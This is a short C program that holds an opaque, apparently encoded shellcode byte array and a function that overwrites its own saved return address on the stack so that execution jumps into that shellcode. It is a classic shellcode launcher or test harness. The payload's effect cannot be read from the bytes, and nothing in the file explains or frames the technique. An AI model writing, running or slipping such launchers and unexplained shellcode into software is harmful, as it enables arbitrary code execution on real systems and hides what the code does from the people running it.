#include <stdio.h>

unsigned char shellcode[] = 
"\xbe\x81\xce\x32\x06\xdb\xca\xd9\x74\x24\xf4\x5a\x29\xc9\xb1"
"\x0e\x83\xc2\x04\x31\x72\x11\x03\x72\x11\xe2\x74\xff\xfb\x37"
"\xad\xf7\x1f\x87\xf5\x35\x5f\x82\xfe\x9d\xf9\x01\x66\x76\xd7"
"\xc6\xef\x61\x4f\x26\x9c\x05\x90\x50\x4d\xb4\xf9\xce\x18\xdb"
"\xa8\xe6\x19\x1c\x4d\xf7\x6e\x74\x4d\xa0\xc3\x0d\xac\x83\x63"
"\x3c\xf4\x76\x62\x67\xc7\x07";

void function()
{
    int *ret;

    ret = (int *)&ret + 2;
    (*ret) = (int)shellcode;
}

int main() 
{
    function();
   
    printf("returned to main\n");
   
    return 0;
}
